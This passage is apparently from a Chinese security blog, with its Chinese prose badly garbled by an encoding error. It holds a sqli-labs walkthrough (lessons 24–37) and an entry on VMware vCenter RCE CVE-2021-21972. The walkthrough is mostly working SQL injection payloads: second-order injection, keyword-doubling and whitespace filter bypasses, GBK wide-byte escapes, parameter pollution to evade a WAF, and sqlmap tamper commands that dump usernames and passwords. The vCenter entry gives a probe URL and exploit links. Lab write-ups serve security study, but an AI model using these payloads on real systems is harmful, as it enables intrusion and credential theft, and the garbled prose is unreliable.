æ˜¯å¦æ­£ç¡®â€”â€”â€“ã€‹è·å–è¦ä¿®æ”¹çš„å¯†ç â€”â€”â€”ã€‹ä¿®æ”¹å¯†ç æˆåŠŸã€‚ åœ¨æ•°æ®åº“ä¸­ â€“ è¡¨ç¤ºæ³¨é‡Šçš„æ„æ€ï¼Œåé¢çš„è¯­å¥<br>ä¸ä¼šæ‰§è¡Œï¼Œè€Œrootåé¢çš„é‚£ä¸ªå•å¼•å·åˆä¸å‰é¢çš„ â€˜ é—­åˆï¼Œè€ŒåŸæœ¬åé¢çš„é‚£ä¸ªå•å¼•å·å› ä¸ºæ˜¯åœ¨ â€“ ä¹‹åï¼Œæ‰€ä»¥å°±è¢«æ³¨é‡Šæ‰äº†ï¼Œæ‰€ä»¥<br>ä»–ä¿®æ”¹çš„å…¶å®æ˜¯  root çš„å¯†ç <br>æœ¬å…³æµ‹è¯•ï¼š<br>1ã€æ–°æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç”¨æˆ·åä¸ºadminâ€™orâ€™â€™=â€™ å¯†ç ä¸º123.<br>2ã€ç”¨è¯¥ç”¨æˆ·ç™»å½•adminâ€™roâ€™â€™=â€™ç™»å½•æˆåŠŸåï¼Œä¿®æ”¹å¯†ç <br>3ã€è¾“å…¥å½“å‰å¯†ç 123ï¼Œç„¶åè¾“å…¥æ–°å¯†ç 123456<br>4ã€ç‚¹å‡»resetï¼Œå¯†ç ä¿®æ”¹æˆåŠŸï¼Œæ­¤æ—¶å‘ç°adminè´¦æˆ·çš„å¯†ç è¢«ä¿®æ”¹ã€‚<br>è¿™é‡Œæ³¨å…¥å‚æ•°æ˜¯æ”»å‡»è€…åœ¨æ³¨å†Œçš„æ—¶å€™è®²æ³¨å…¥å‚æ•°adminâ€™orâ€™â€™=â€™å†™åˆ°æ•°æ®åº“çš„ã€‚è°ƒç”¨çš„æ—¶å€™åŒ…å«äº†æ„é€ çš„é—­åˆå•å¼•å·çš„å‚æ•°ã€‚ä¸å€ŸåŠ©è¿™ç§æ–¹æ³•ï¼Œå‘ç°åœ¨è¡¨å•è¾“å…¥çš„å¸¦æœ‰æ³¨å…¥ç¬¦å·çš„éƒ½è¢«ç¨‹åºè½¬ä¹‰äº†ã€‚</p>
<p>ç¬¬äºŒåäº”å…³ï¼šå•å¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼Œä½†æ˜¯åå°è¿‡æ»¤äº†æ‰€æœ‰çš„andå’Œoræ³¨å…¥è¯ã€‚<br>å½“è¾“å…¥<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yNS8/aWQ9MSYjMzk7YW5k">http://192.168.13.155/sqli/Less-25/?id=1&#39;and<i class="fa fa-external-link-alt"></i></span> 1=1 â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yNS8/aWQ9MSYjMzk7">http://192.168.13.155/sqli/Less-25/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> or1=1 â€“+<br>å‘ç°é¡µé¢è¿”å›å€¼andå’Œorè¢«è¿‡æ»¤äº†ï¼Œå¯¼è‡´æ— æ³•æ­£å¸¸æ‰§è¡Œæ³¨å…¥è¯­å¥ã€‚<br>è¿™é‡Œçš„å¯ä»¥æ³¨å…¥æ—¶ï¼Œç”¨åˆ°andæˆ–oræ˜¯éœ€è¦è¿›è¡Œå˜æ¢ï¼Œä¾‹å¦‚andç”¨ananddï¼ˆåŒå†™ï¼‰æ›¿ä»£ï¼ˆæˆ–è€…&amp;&amp;ï¼‰ï¼Œorç”¨oorrä»£æ›¿ï¼ˆæˆ–è€…||ï¼‰ã€‚è¢«è¿‡æ»¤åå˜æˆäº†andå’Œorã€‚</p>
<p>ç¬¬äºŒåäº”Aå…³ï¼šä¸äºŒåäº”å…³ç±»ä¼¼ï¼Œæ•°å€¼å‹æ³¨å…¥ï¼Œandå’Œorè¢«è¿‡æ»¤ï¼Œè¿‡æ»¤æ–¹æ³•ä¸25å…³ä¸€æ ·ã€</p>
<p>ç¬¬äºŒåå…­å…³ï¼šè¿™é‡Œç©ºæ ¼å’Œandã€orå‡è¢«è¿‡æ»¤äº†ã€‚andå’Œorå¯ä»¥å‚è€ƒäºŒåäº”å…³ï¼Œç©ºæ ¼è¿‡æ»¤æ¯”è¾ƒä¸¥ ï¼Œå¸¸è§çš„â€“,#,//,/**/éƒ½è¢«è¿‡æ»¤ï¼ŒåŒ…æ‹¬å¸¸è§çš„<br>%09 TABé”®ï¼ˆæ°´å¹³ï¼‰<br>%0a æ–°å»ºä¸€è¡Œ<br>%0c æ–°çš„ä¸€é¡µ<br>%0d returnåŠŸèƒ½<br>%0b TABé”®ï¼ˆå‚ç›´ï¼‰<br>æµ‹è¯•åªæœ‰%a0å¯ä»¥ç”Ÿæ•ˆã€‚<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yNi8/aWQ9MSUyN29vcnJkZXIlRUYlQkYlQkRieSVFRiVCRiVCRDElRUYlQkYlQkRhbmFuZGQlRUYlQkYlQkQlMjcxJTI3PSUyNzE=">http://192.168.13.155/sqli/Less-26/?id=1%27oorrder%a0by%a01%a0anandd%a0%271%27=%271<i class="fa fa-external-link-alt"></i></span><br>æš´åº“<br>?id=1111%27%a0union%a0select%a01,database(),3%a0||%271%27=%271<br>çˆ†è¡¨å<br>?id=1000%27%a0union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%271%27=%271<br>çˆ†å­—æ®µ<br>?id=1000%27%a0union%a0select%a01,group_concat(column_name),3%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema=%27security%27%26%26%271%27=%271<br>çˆ†å†…å®¹<br>?id=1000%27%a0union%a0select%a01,group_concat(username,passwoorrd),3%a0from%a0users%a0where%a0id=1%26%26%271%27=%271</p>
<p>æœ¬å…³å¯ä»¥åœ¨sqlmapä¸­è·‘ï¼Œéœ€è¦å€ŸåŠ©â€“tamperå‚æ•°ï¼Œå¹¶ä¸”è‡ªå®šä¹‰è„šæœ¬ã€‚å˜æ¢andã€orå’Œspaceã€‚<br>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yNi8/aWQ9MSZxdW90Ow==">http://192.168.13.155/sqli/Less-26/?id=1&quot;<i class="fa fa-external-link-alt"></i></span> -v 3 â€“tamper  â€œsymboliclogical1.py,space2a0.pyâ€ -D security â€“tables</p>
<p>ç¬¬äºŒåå…­aå…³ï¼šæœ¬å…³ä¸ºç›²æ³¨ï¼Œå•å¼•å·å­—ç¬¦ä¸²å¹¶åº”ç”¨äº†ï¼‰ã€‚ç”¨æ³•ä¸26ä¸€è‡´ï¼Œéœ€è¦å˜æ¢andå’Œç©ºæ ¼ã€‚<br>æŠ¥é”™æ— æ³•å›æ˜¾ï¼Œä½†æ˜¯å¯ä»¥ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yNmEvP2lkPTElMjcpJUVGJUJGJUJEJiY=">http://192.168.13.155/sqli/Less-26a/?id=1%27)%a0%26%26<i class="fa fa-external-link-alt"></i></span>(%27%27=%27<br>æš´åº“<br>?id=1111%27)%a0union%a0select%a01,database(),3%a0||(%271%27)=(%271<br>çˆ†è¡¨å<br>?id=1000%27)%a0union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26(%271%27)=(%271<br>çˆ†å­—æ®µ<br>?id=1000%27)%a0union%a0select%a01,group_concat(column_name),3%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema=%27security%27%26%26(%271%27)=(%271<br>çˆ†å†…å®¹<br>?id=1000%27)%a0union%a0select%a01,group_concat(username,passwoorrd),3%a0from%a0users%a0where%a0id=1%26%26(%271%27)=(%271<br>ç”¨sqlmapè·‘ï¼š<br>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yNmEvP2lkPTEmcXVvdDs=">http://192.168.13.155/sqli/Less-26a/?id=1&quot;<i class="fa fa-external-link-alt"></i></span> -v 3 â€“tamper â€œsymboliclogical.py,space2a0.pyâ€</p>
<p>ç¬¬äºŒåä¸ƒå…³ï¼šè¿‡æ»¤äº†äº†unionï¼ŒåŒé‡è¿‡æ»¤äº†selectï¼Œè¿‡æ»¤äº†ç©ºæ ¼ã€‚å¯ä»¥ç”¨å¦‚ä¸‹æ–¹å¼ç»•è¿‡<br>ununionion seseleselectctlec %0A<br>?id=1000â€™%0A ununionion%0A seseleselectctlect%20%0A1,2,3%0A and%0A â€˜1â€™=â€™1<br>æš´åº“<br>?id=1000%27%0aununionion%a0seseleselectctlect%a01,database(),3%a0and%0A%20%271%27=%271<br>çˆ†è¡¨<br>?id=1000%27%0aununionion%a0seseleselectctlect%a01,(selseleselectctect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=%27security%27),3%a0and%0A%20%271%27=%271<br>çˆ†å­—æ®µ<br>?id=1000%27%0aununionion%a0seseleselectctlect%a01,(selseleselectctect%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_schema=%27security%27),3%a0and%0A%20%271%27=%271<br>çˆ†å†…å®¹<br>?id=1000%27%0aununionion%a0seseleselectctlect%a01,(selseleselectctect%a0group_concat(password,username)%a0from%a0security.users),3%a0and%0A%20%271%27=%271</p>
<p>ç¬¬äºŒåä¸ƒaå…³ï¼šåŒå¼•å·ã€å­—ç¬¦å‹ã€è¿‡æ»¤æ³¨é‡Šã€union select ç›²æ³¨ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹æ–¹å¼ç»•è¿‡<br>ununionion seseleselectctlec %0A<br>?id=1â€and â€œ1â€=â€1<br>?id=1â€and â€œ1â€=â€2<br>?id=1000â€ ununionion%0Aseleseselectlectct%20%0A1,2,3%0A and â€œ1â€=â€1<br>çˆ†åº“<br>?id=1000â€%0aununionion%a0seseleselectctlect%a01,database(),3%a0and â€œ1â€=â€1<br>çˆ†è¡¨<br>?id=1000â€%0aununionion%a0seseleselectctlect%a01,(selseleselectctect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=%27security%27),3%a0and â€œ1â€=â€1<br>çˆ†å­—æ®µ<br>?id=1000â€%0aununionion%a0seseleselectctlect%a01,(selseleselectctect%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_schema=%27security%27),3%a0and â€œ1â€=â€1<br>çˆ†å†…å®¹<br>?id=1000â€%0aununionion%a0seseleselectctlect%a01,(selseleselectctect%a0group_concat(password,username)%a0from%a0security.users),3%a0and â€œ1â€=â€1</p>
<p>ç¬¬äºŒåå…«å…³ï¼šå•å¼•å·ã€æ‹¬å·ã€æ³¨é‡Šç¬¦å·ã€ç©ºæ ¼ union&amp;select è¢«è¿‡æ»¤<br>æ›¿ä»£æ–¹æ³•ï¼š%0a æ›¿ä»£ç©ºæ ¼ï¼Œunion%0Aunion%0A select select åŒå†™æ›¿ä»£union select<br>?id=1â€™)and (â€˜1â€™=â€™1<br>?id=1â€™)and (â€˜1â€™=â€™2<br>?id=1000â€™)%0A union%0Aunion%0A select select%20%0A1,2,3%0A and%0A (â€˜1â€™=â€™1<br>çˆ†åº“<br>?id=1000â€™)%0A union%0Aunion%0A select select%20%0A1,database(),3%0A and%0A (â€˜1â€™=â€™1<br>çˆ†è¡¨<br>?id=1000â€™)%0A union%0Aunion%0A select  select%20%0A1,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=%27security%27),3%0A and%0A (â€˜1â€™=â€™1<br>çˆ†å­—æ®µ<br>?id=1000â€™)%0A union%0Aunion%0A select  select%20%0A1,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_schema=%27security%27),3%0A and%0A (â€˜1â€™=â€™1<br>çˆ†å†…å®¹<br>?id=1000â€™)%0A union%0Aunion%0A select  select%20%0A1,(select%a0group_concat(password,username)%a0from%a0security.users),3%0A and%0A (â€˜1â€™=â€™1</p>
<p>ç¬¬äºŒåå…«aå…³ï¼šä¸äºŒåå…«payloadæ— åŒºåˆ«ã€‚<br>?id=1â€™) and (â€˜1â€™=â€™1<br>?id=1â€™) and (â€˜1â€™=â€™2</p>
<p>ç¬¬äºŒåä¹å…³ï¼šlogin.phpä¸æ˜¯index.phpã€‚<br>è¿™é‡Œæ˜¯phpçš„ä¸€ä¸ªhppæ¼æ´ï¼Œå½“åŒæ—¶ä¼ é€’å¤šä¸ªå‚æ•°æ—¶ï¼Œä¸åŒæœåŠ¡å™¨å¯èƒ½ä¼šå–å¾—ä¸åŒçš„å‚æ•°å€¼ã€‚<br>ä¾‹å¦‚<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yOS9sb2dpbi5waHA/aWQ9MSZhbXA7aWQ9MiZhbXA7aWQ9MyVFNSU5MCU4QyVFNiU5NyVCNiVFNCVCQyVBMCVFOSU4MCU5MjMlRTQlQjglQUElRTUlOEYlODIlRTYlOTUlQjA=">http://192.168.13.155/sqli/Less-29/login.php?id=1&amp;id=2&amp;id=3åŒæ—¶ä¼ é€’3ä¸ªå‚æ•°<i class="fa fa-external-link-alt"></i></span><br>$_get(id) Apacheå¤„ç†æ—¶è·å¾—æœ€åä¸€ä¸ªIDï¼Œä¹Ÿå°±æ˜¯Id=3<br>$_SERVER[â€˜QUERY_STRINGâ€™]ï¼Œåˆ™è·å–çš„æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³id=1<br>å¦‚ä½•åˆ©ç”¨ï¼Ÿ<br>wafä¼šå¯¹æŸ¥è¯¢å‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œä½†æ˜¯å¦‚æœæ˜¯ç›´æ¥ä»å­—ç¬¦ä¸²åå»å˜é‡ï¼Œåˆ™å¯èƒ½æ˜¯è·å¾—çš„ç¬¬ä¸€ä¸ªå˜é‡åŠid=1ï¼Œä½†æ˜¯å®é™…åå°ç¨‹åºåœ¨$_get(id) æ—¶ï¼Œè·å¾—çš„æ˜¯åä¸€ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨åä¸€ä¸ªå‚æ•°æ·»åŠ æ³¨å…¥è¯­å¥ï¼Œä»è€Œç»•è¿‡wafæ£€æŸ¥ã€‚<br>å‚è€ƒæ–‡ç« ï¼š<br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2VhdG1pbGtib3kvYXJ0aWNsZS9kZXRhaWxzLzY3NjE0MDc=">https://blog.csdn.net/eatmilkboy/article/details/6761407<i class="fa fa-external-link-alt"></i></span><br>Webåº”ç”¨é‡Œçš„HTTPå‚æ•°æ±¡æŸ“ï¼ˆHPPï¼‰æ¼æ´<br>æœ¬å…³å¡å®ç°ï¼š<br>æš´åº“<br>?id=1&amp;id=2â€™ and 1=2 union select 1,database(),3 â€“+<br>çˆ†è¡¨<br>?id=1&amp;id=2â€™ and 1=2 union select  1,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=%27security%27),3 â€“+<br>çˆ†å­—æ®µ<br>?id=1&amp;id=2â€™ and 1=2 union select  1,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_schema=%27security%27),3 â€“+<br>çˆ†å†…å®¹<br>?id=1&amp;id=2â€™ and 1=2 union select 1,(select%a0group_concat(password,username)%a0from%a0security.users),3 â€“+</p>
<p>sqlmap<br>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yOS9sb2dpbi5waHA/aWQ9MSZxdW90Ow==">http://192.168.13.155/sqli/Less-29/login.php?id=1&quot;<i class="fa fa-external-link-alt"></i></span> -v 3</p>
<p>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zMC9sb2dpbi5waHA/aWQ9MSZxdW90Ow==">http://192.168.13.155/sqli/Less-30/login.php?id=1&quot;<i class="fa fa-external-link-alt"></i></span> -v 3 â€“dbs â€“batch<br>ç¬¬ä¸‰åå…³ï¼šä¸29å…³åŸç†ä¸€è‡´ï¼ŒåŒå¼•å·ï¼ŒåŸºäºæ—¶é—´çš„ç›²æ³¨<br>login.php?id=1&amp;id=2â€and if(2&gt;1,sleep(10),1) â€“+<br>ç¬¬ä¸‰åä¸€å…³ï¼šä¸30å…³åŸç†ä¸€è‡´ï¼ŒåŒå¼•å·ï¼Œå•æ‹¬å·ï¼Œæ„é€ åŸºäºæ—¶é—´å»¶è¿Ÿç›²æ³¨<br>192.168.13.155/sqli/Less-31/login.php?id=1&amp;id=3â€) and 1&lt;2 and sleep(5) and (â€œ1â€=â€1<br>ç”±äºæŠ¥é”™å›æ˜¾ï¼Œä¹Ÿå¯ä»¥ç”¨floorç­‰å‡½æ•°<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zMS9sb2dpbi5waHA/aWQ9MSZhbXA7aWQ9MyUyMiklMjBhbmQlMjAodXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCUyMChzZWxlY3QlMjBjb25jYXQodXNlcixwYXNzd29yZCklMjBmcm9tJTIwZHZ3YS51c2VycyUyMGxpbWl0JTIwMCwxKSksMHg3ZSksMSkpJTIwLS0r">http://192.168.13.155/sqli/Less-31/login.php?id=1&amp;id=3%22)%20and%20(updatexml(1,concat(0x7e,(select%20(select%20concat(user,password)%20from%20dvwa.users%20limit%200,1)),0x7e),1))%20--+<i class="fa fa-external-link-alt"></i></span></p>
<p>ç¬¬ä¸‰åäºŒå…³ï¼šæ‰€æœ‰çš„â€™å•å¼•å·ï¼Œéƒ½è¢«è½¬ä¹‰ã€‚å› æ­¤éœ€è¦æ„é€ ç»•è¿‡è½¬ä¹‰<br>  æºç ï¼šè‡ªå®šä¹‰äº†æ£€æµ‹æ³¨å…¥å­—ç¬¦ä¸²ï¼Œè¿›è¡Œè½¬ä¹‰ã€‚<br>$string = preg_replace(â€˜/â€˜. preg_quote(â€˜\â€˜) .â€™/â€˜, â€œ\\\â€œ, $string);   //escape any backslash<br>$string = preg_replace(â€˜/&#39;/iâ€™, â€˜\&#39;â€˜, $string);                //escape single quote with a backslash<br> $string = preg_replace(â€˜/&quot;/â€˜, â€œ\&quot;â€œ, $string);                //escape double quote with a backslash</p>
<p>â€˜å•å¼•å·æ›¿æ¢ä¸ºæ„é€ å®½å­—èŠ‚ %dfâ€™<br>?id=0%dfâ€™ union all select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()â€“+</p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zMi8/aWQ9MCVFRiVCRiVCRCYjMzk7">http://192.168.13.155/sqli/Less-32/?id=0%df&#39;<i class="fa fa-external-link-alt"></i></span> union all select 1,group_concat(table_name),3 from  information_schema.tables where table_schema=database()â€“+</p>
<p>ç¬¬ä¸‰åä¸‰å…³ï¼šæ‰€æœ‰çš„â€™å•å¼•å·ï¼Œéƒ½è¢«è½¬ä¹‰ã€‚<br>åˆ©ç”¨addslashes($str)ï¼Œå¯¹æ³¨å…¥å­—ç¬¦ä¸²è¿›è¡Œç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œæ¶‰åŠ<br>  å•å¼•å·ï¼ˆâ€™ï¼‰â€”&#39;<br>  åŒå¼•å·ï¼ˆâ€ï¼‰â€”&quot;<br>  åæ–œæ ï¼ˆ\ï¼‰â€”\<br>  NULL<br>ç»•è¿‡æ–¹æ³•ï¼šåƒæ‰è½¬ä¹‰å­—ç¬¦æˆ–è½¬ä¹‰<br>æ–¹æ³•ä¸€ï¼š<br>mysql åœ¨ä½¿ç”¨GBK ç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªascii ç è¦å¤§äº128ï¼Œgbkçš„æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚<br>è¾“å…¥%df%27æ—¶ï¼Œ%27æ—¶â€™ä¼šè¢«è½¬ç§»ä¸º\â€™,è€Œ\çš„ç¼–ç ä¸º%5cï¼Œæœ€åå°±å˜æˆäº†%df %5c%27ï¼Œç”±äº%dfï¼ˆè¿™é‡Œ16è¿›åˆ¶ï¼‰&gt;128ï¼ˆasciiç å€¼ï¼‰ï¼Œmysqlå°±è®¤ä¸ºå‰ä¸¤ä¸ªç¼–ç æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œé‹ï¼Œæœ€åç»“æœå°±ç¼–ç¨‹äº†é‹â€™,æˆåŠŸåƒæ‰äº†è½¬ä¹‰çš„åæ–œæ <br>å®é™…ä¸Šï¼Œåªè¦ç¼–ç å€¼å¤§äº128ï¼Œå‡å¯ä»¥å®ç°åƒæ‰\ã€‚ä¾‹å¦‚%81ï¼Œ%82ï¼Œ%83ç­‰ç­‰ã€‚<br>payload:<br>/?id=1%dF%27 and 1=1 â€“+<br>æ–¹æ³•äºŒï¼šåˆ©ç”¨æ±‰å­—â€˜éŒ¦â€™<br>éŒ¦ çš„UTF-8ç¼–ç ä¸ºï¼š %E9%8C%A6<br>éŒ¦ çš„GBKç¼–ç ä¸ºï¼š %e5%5c<br>å®ç”¨ï¼šç›´æ¥è¾“å…¥%E9%8C%A6%27æˆ–%e5%5c%27<br>åŸç†ï¼š%e5\â€™(å³%e5%5c%27)?%e5%5c%5c%5c%27?éŒ¦\â€™ï¼Œè¿™æ ·åæ–œæ å°±è¢«è½¬ä¹‰äº†ã€‚<br>payload:<br>/?id=1%e5%5cand 1=1 â€“+</p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zMy8/aWQ9MCVFRiVCRiVCRCYjMzk7dW5pb24lMjBzZWxlY3QlMjAx">http://192.168.13.155/sqli/Less-33/?id=0%df&#39;union%20select%201<i class="fa fa-external-link-alt"></i></span>,(select group_concat(table_name) from information_schema.tables where  table_schema=database()),3â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zMy8/aWQ9MCVFRiVCRiVCRCYjMzk7dW5pb24lMjBzZWxlY3QlMjAx">http://192.168.13.155/sqli/Less-33/?id=0%bf&#39;union%20select%201<i class="fa fa-external-link-alt"></i></span>,(select group_concat(table_name) from information_schema.tables where  table_schema=database()),3â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zMy8/aWQ9MCVFRiVCRiVCRCYjMzk7dW5pb24lMjBzZWxlY3QlMjAx">http://192.168.13.155/sqli/Less-33/?id=0%bf&#39;union%20select%201<i class="fa fa-external-link-alt"></i></span>,(select group_concat(table_name) from information_schema.tables where  table_schema=database()),3â€“+</p>
<p>ç¬¬ä¸‰åå››å…³ï¼šåŸºäºpostçš„æ³¨å…¥ï¼Œå•å¼•å·è¢«è½¬ä¹‰ã€‚<br>å®½å­—èŠ‚å¯ç”¨<br>ç›´æ¥ç”¨sqlmap è·‘ï¼ŒåŠ å‰ç¼€ %df%27<br>&gt;python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zNC8mcXVvdDs=">http://192.168.13.155/sqli/Less-34/&quot;<i class="fa fa-external-link-alt"></i></span> â€“data  â€œuname=admin&amp;passwd=admin&amp;submit=Submitâ€ -v 3 â€“prefix â€œ%df%27â€</p>
<p>ç¬¬ä¸‰åäº”å…³ï¼šåŸºäºæ•´å½¢çš„æ³¨å…¥ï¼Œè™½ç„¶è½¬ä¹‰äº†â€™ï¼Œä½†æ˜¯æ•°å€¼å‹æ³¨å…¥ä¸éœ€è¦å•å¼•å·ï¼Œç›´æ¥æ³¨å…¥å³å¯</p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zNS8/aWQ9MQ==">http://192.168.13.155/sqli/Less-35/?id=1<i class="fa fa-external-link-alt"></i></span> and 1=2 union select 1,(select group_concat(table_name) from  information_schema.tables where table_schema=database()),3</p>
<p>ç¬¬ä¸‰åå…­å…³ï¼šgetå‹ mysql_real_escapeè¯¯ç”¨<br>å®½å­—èŠ‚æ„é€ â€™<br>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zNi8/aWQ9MiZxdW90Ow==">http://192.168.13.155/sqli/Less-36/?id=2&quot;<i class="fa fa-external-link-alt"></i></span> -v 3 â€“tamper unmagicquotes.py</p>
<p>ç¬¬ä¸‰åä¸ƒå…³ï¼špostå‹<br>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zNy8mcXVvdDs=">http://192.168.13.155/sqli/Less-37/&quot;<i class="fa fa-external-link-alt"></i></span> â€“data  â€œuname=admin&amp;passwd=admin&amp;submit=Submitâ€ -v 3 â€“tamper  unmagicquotes.py â€“dbs</p>
]]></content>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware vCenter RCE (CVE-2021-21972)</title>
    <url>/posts/86c4df43/</url>
    <content><![CDATA[<p>CVE-2021-21972 vmware vcenterçš„ä¸€ä¸ªæœªæˆæƒçš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´å¯ä»¥ä¸Šä¼ ä¸€ä¸ªwebshellè‡³vcenteræœåŠ¡å™¨çš„ä»»æ„ä½ç½®ï¼Œç„¶åæ‰§è¡Œwebshellå³å¯ã€‚ã€‚</p>
<a id="more"></a>



<h1 id="VMware-vCenter-RCE-CVE-2021-21972"><a href="#VMware-vCenter-RCE-CVE-2021-21972" class="headerlink" title="VMware vCenter RCE (CVE-2021-21972)"></a>VMware vCenter RCE (CVE-2021-21972)</h1><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><ul>
<li>VMware vCenter Server 7.0ç³»åˆ— &lt; 7.0.U1c</li>
<li>VMware vCenter Server 6.7ç³»åˆ— &lt; 6.7.U3l</li>
<li>VMware vCenter Server 6.5ç³»åˆ— &lt; 6.5 U3n</li>
<li>VMware ESXi 7.0ç³»åˆ— &lt; ESXi70U1c-17325551</li>
<li>VMware ESXi 6.7ç³»åˆ— &lt; ESXi670-202102401-SG</li>
<li>VMware ESXi 6.5ç³»åˆ— &lt; ESXi650-202102101-SG</li>
</ul>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>è®¿é—®<code>https://&lt;VC-IP-or-FQDN&gt;/ui/vropspluginui/rest/services/updateova</code></p>
<p>å¦‚æœ404ï¼Œåˆ™ä»£è¡¨ä¸å­˜åœ¨æ¼æ´</p>
<blockquote>
<p>åœ¨æµ‹è¯•æ—¶å€™ï¼Œå†…ç½‘å¥½å¤šæœºå™¨éƒ½æ˜¯200ã€400ç­‰ï¼Œå°±æ˜¯æ²¡405- - </p>
<p>ç„¶åå‘ç°ä¸€ä¸ªæ²¡æ‰“æˆã€‚ã€‚ã€‚ã€‚</p>
</blockquote>
<p>å¯èƒ½çœŸçš„éœ€è¦405å§ï¼Œçœ‹ä¸æ‡‚ä»£ç ï¼Œç•¥è¿‡ã€‚ã€‚</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2J1dG5vbWluZ3ppL0NWRS0yMDIxLTIxOTcy">EXPä¸‹è½½åœ°å€<i class="fa fa-external-link-alt"></i></span></p>
<p>æ‰¹é‡æ£€æµ‹ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0VkZ2VTZWN1cml0eVRlYW0vVnVsbmVyYWJpbGl0eS9ibG9iL21haW4vVk13YXJlJTIwdkNlbnRlciUyMFNlcnZlciUyMCVFOCVCRiU5QyVFNyVBOCU4QiVFNiU4OSVBNyVFOCVBMSU4QyVFNCVCQiVBMyVFNyVBMCU4MSVFNiVCQyU4RiVFNiVCNCU5RSUyMChDVkUtMjAyMS0yMTk3MikubWQ=">POCæ‰¹é‡æ£€æµ‹è„šæœ¬ä¸‹è½½åœ°å€<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><p>vmwareä¿®å¤æ–¹æ³•æ¯”è¾ƒç®€å•ï¼Œåªæ˜¯å…³é—­æœ‰æ¼æ´çš„ç›¸å…³æ’ä»¶ <code>com.vmware.vrops.install</code></p>
<p>å¹¶ä¸”å®˜æ–¹è¿˜é™„èµ äº†æ˜¯å¦å…³é—­æˆåŠŸæ’ä»¶çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯è®¿é—®<br><code>https://&lt;VC-IP-or-FQDN&gt;/ui/vropspluginui/rest/services/checkmobregister</code></p>
<p>å½“ç„¶è¿˜å¯ä»¥å‡çº§ç‰ˆæœ¬ã€‚</p>
